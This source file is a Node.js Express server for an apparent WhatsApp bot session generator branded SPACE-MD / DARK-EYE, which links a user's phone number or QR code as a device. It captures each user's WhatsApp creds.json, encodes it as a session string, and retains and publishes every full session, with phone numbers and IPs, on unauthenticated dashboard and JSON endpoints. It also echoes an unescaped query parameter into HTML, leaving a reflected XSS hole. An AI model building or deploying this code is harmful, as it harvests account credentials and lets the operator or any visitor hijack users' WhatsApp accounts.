const express = require('express');
const fs = require('fs');
const cors = require('cors');
const { getPairCode } = require('./connection/pair');
const { startQRGeneration, getCurrentQR } = require('./connection/qr');
const { addPair, addSession, getData } = require('./connection/dashboard');

const app = express();
app.use(cors());
app.use(express.json());
const PORT = process.env.PORT || 10000;

let lastSession = null;
let lastCreds = null;
let lastBot = 'SPACE-MD';

function load101(){
  try{ return fs.readFileSync('./101','utf8'); }
  catch{ return '101 missing'; }
}

app.get('/', (req,res)=>{
  lastBot = req.query.bot || lastBot || 'SPACE-MD';
  res.send(load101());
});

app.get('/pair', async (req,res)=>{
  let number = (req.query.number||'').replace(/[^0-9]/g,'');
  let bot = req.query.bot || lastBot || 'SPACE-MD';
  lastBot = bot;
  if(!number || number.length < 10) return res.json({ error: 'Invalid number. Use full: 2637xxxxxxx (10-15 digits)', example: '/pair?number=263785123456&bot=SPACE-MD' });

  console.log(`[${bot}] Pair request ${number}`);
  try{
    const result = await getPairCode(number, ()=>{});
    addPair({ bot, number, code: result.code, ip: req.ip });
    res.json({ bot, number, code: result.code, status: 'Enter in WhatsApp > Linked Devices > Link with phone number' });

    const handleConnect = (credsPath, dir, sock)=>{
      const check = setInterval(()=>{
        if(fs.existsSync(credsPath)){
          const creds = fs.readFileSync(credsPath,'utf8');
          lastCreds = creds;
          lastSession = 'DARK-EYE~' + Buffer.from(creds).toString('base64');
          addSession({ bot, number, session: lastSession.slice(0,40)+'...', full: lastSession });
          clearInterval(check);
          try{ fs.rmSync(dir,{recursive:true,force:true}); sock.end(); }catch{}
        }
      },1000);
      setTimeout(()=>clearInterval(check), 120000);
    };

    if(result.sock && result.dir){
      handleConnect(result.dir+'/creds.json', result.dir, result.sock);
      result.sock.ev.on('connection.update', u=>{
        if(u.connection==='open'){
          const p = result.dir+'/creds.json';
          if(fs.existsSync(p)){
            const creds = fs.readFileSync(p,'utf8');
            lastCreds = creds;
            lastSession = 'DARK-EYE~' + Buffer.from(creds).toString('base64');
            addSession({ bot, number, session: lastSession });
          }
        }
      });
    }
  }catch(e){
    res.json({ bot, number, error: e.message });
  }
});

app.get('/qr', (req,res)=>{
  let bot = req.query.bot || lastBot;
  lastBot = bot;
  const qr = getCurrentQR();
  if(qr){
    res.send(`<html><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="refresh" content="7"><body style="background:#000;color:#0f0;font-family:monospace;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center"><h2>${bot} QR</h2><img src="${qr}" style="width:320px;border:4px solid #0f0;border-radius:18px"><br><br><a href="/dashboard?bot=${bot}" style="color:#000;background:#0f0;padding:10px 20px;border-radius:10px;text-decoration:none">DASHBOARD</a> <a href="/" style="color:#0f0;border:1px solid #0f0;padding:10px 20px;border-radius:10px;text-decoration:none;margin-left:8px">HOME</a></body></html>`);
  } else {
    res.send(`<html><meta http-equiv="refresh" content="3"><body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh">Generating QR for ${bot}...</body></html>`);
    startQRGeneration(()=>{}, (creds)=>{
      if(creds){
        lastCreds=creds;
        lastSession='DARK-EYE~'+Buffer.from(creds).toString('base64');
        addSession({ bot, number:'QR', session: lastSession });
      }
    });
  }
});

app.get('/sessions', (req,res)=>{
  let bot = req.query.bot || lastBot;
  if(lastSession) res.json({ bot, session: lastSession });
  else res.json({ bot, error: 'No session yet. Pair first via /pair?number=263...&bot='+bot });
});

app.get('/dashboard', (req,res)=>{
  const data = getData();
  let bot = req.query.bot || lastBot;
  res.send(`
  <!DOCTYPE html><html><head><title>DASHBOARD</title><meta name="viewport" content="width=device-width,initial-scale=1">
  <style>*{box-sizing:border-box;font-family:monospace}body{background:#080808;color:#0f0;margin:0;padding:16px}
  .top{display:flex;justify-content:space-between;align-items:center;border:1px solid #0f0;padding:14px;border-radius:14px;margin-bottom:16px}
  .card{border:1px solid rgba(0,255,0,.3);border-radius:14px;padding:14px;margin-bottom:12px;background:rgba(0,255,0,.03)}
  .badge{background:#0f0;color:#000;padding:3px 8px;border-radius:10px;font-size:10px;font-weight:800}
  a{color:#000;background:#0f0;padding:8px 14px;border-radius:8px;text-decoration:none;font-weight:700;font-size:12px}
  table{width:100%;font-size:11px;border-collapse:collapse}
  td,th{padding:8px;border-bottom:1px solid rgba(0,255,0,.15);text-align:left}
  </style></head><body>
  <div class="top"><div><b>DARK-EYE DASHBOARD</b><br><span style="font-size:10px;opacity:.6">SPACE-MD => dark-eye-official => index.js => 101 => pair.js</span></div><div><a href="/">HOME</a> <a href="/qr?bot=${bot}">QR</a></div></div>

  <div class="card"><b>Current Live Session</b><br><br>${lastSession?`<div style="word-break:break-all;background:#000;padding:10px;border-radius:8px;font-size:9px">${lastSession}</div>`:`<span style="opacity:.5">No active session</span>`}</div>

  <div class="card"><b>Recent Pair Requests (${data.pairs.length})</b><br><br>
  <table><tr><th>Time</th><th>Bot</th><th>Number</th><th>Code</th></tr>
  ${data.pairs.map(p=>`<tr><td>${new Date(p.time).toLocaleString()}</td><td>${p.bot}</td><td>${p.number}</td><td>${p.code}</td></tr>`).join('')||'<tr><td colspan=4>None</td></tr>'}
  </table></div>

  <div class="card"><b>Recent Sessions (${data.sessions.length})</b><br><br>
  <table><tr><th>Time</th><th>Bot</th><th>Number</th><th>Session Preview</th></tr>
  ${data.sessions.map(s=>`<tr><td>${new Date(s.time).toLocaleString()}</td><td>${s.bot}</td><td>${s.number}</td><td style="font-size:8px">${s.session?.slice(0,60)}...</td></tr>`).join('')||'<tr><td colspan=4>None</td></tr>'}
  </table></div>
  </body></html>
  `);
});

app.get('/dashboard.json', (req,res)=>{ res.json(getData()); });

app.listen(PORT, ()=>console.log('Dashboard live on '+PORT));
